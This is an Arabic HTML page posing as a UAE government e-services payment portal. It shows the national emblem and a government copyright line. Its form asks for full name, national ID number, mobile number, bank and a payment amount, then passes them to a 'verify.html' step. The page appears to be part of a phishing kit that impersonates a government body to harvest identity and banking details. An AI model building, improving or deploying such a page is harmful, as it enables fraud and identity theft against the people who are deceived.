<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>بوابة دفع قيمة الخدمات الإلكترونية</title>
  <style>
    body {
      font-family: Tahoma, Arial, sans-serif;
      direction: rtl;
      margin: 0;
      padding: 0;
      background-color: #fff;
    }
    header {
      text-align: center;
      padding: 20px;
    }
    header img {
      height: 80px;
    }
    main {
      padding: 20px;
    }
    form {
      max-width: 400px;
      margin: auto;
      background: #fff;
      padding: 20px;
      border-radius: 6px;
      box-shadow: 0 0 5px rgba(0,0,0,0.2);
    }
    label {
      display: block;
      margin-top: 15px;
      font-weight: bold;
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 4px;
      box-sizing: border-box;
    }
    button {
      margin-top: 20px;
      width: 100%;
      padding: 12px;
      background: #0b5320;
      color: #fff;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
    }
    button:hover {
      background: #083d18;
    }
    footer {
      background: #000;
      color: #fff;
      padding: 20px;
      font-size: 13px;
    }
    footer ul {
      list-style: none;
      padding: 0;
      margin: 0;
    }
    footer li {
      margin: 5px 0;
    }
  </style>
</head>
<body>

  <header>
    <img src="https://upload.wikimedia.org/wikipedia/commons/6/65/Emblem_of_the_United_Arab_Emirates.svg" alt="شعار الإمارات">
    <h2>بوابة دفع قيمة الخدمات الإلكترونية</h2>
    <p>حكومة الامارات العربية المتحدة</p>
  </header>

  <main>
    <form action="verify.html" method="get">
      <label>الاسم بالكامل *</label>
      <input type="text" name="fullname" required>

      <label>رقم الهوية *</label>
      <input type="text" name="idnumber" required>

      <label>رقم الجوال *</label>
      <input type="tel" name="mobile" required>

      <label>ادخل البنك الخاص بك *</label>
      <select name="bank" required>
        <option value="">اختر البنك</option>
        <option>بنك أبوظبي الأول</option>
        <option>بنك الإمارات دبي الوطني</option>
        <option>بنك المشرق</option>
        <option>بنك دبي الإسلامي</option>
        <option>بنك أبوظبي التجاري</option>
      </select>

      <label>قيمة رسوم السداد (درهم إماراتي) *</label>
      <input type="number" name="amount" required>

      <button type="submit">المتابعة</button>
    </form>
  </main>

  <footer>
    <ul>
      <li>سياسة الخصوصية</li>
      <li>حقوق النشر</li>
      <li>شروط الاستخدام</li>
      <li>معايير WCAG 2.0 AAA</li>
      <li>© حكومة الإمارات جميع الحقوق محفوظة 2025</li>
    </ul>
  </footer>

</body>
</html>
